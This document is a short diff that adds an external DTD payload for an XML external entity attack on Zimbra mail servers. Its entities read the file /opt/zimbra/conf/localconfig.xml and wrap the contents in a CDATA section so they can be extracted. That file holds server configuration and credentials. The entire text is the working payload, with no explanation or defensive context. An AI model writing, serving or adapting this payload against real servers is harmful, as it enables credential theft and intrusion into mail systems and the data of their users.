@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % mdldt "<![CDA">
+<!ENTITY fileContents '%mdldt;TA[%file;]]>'>
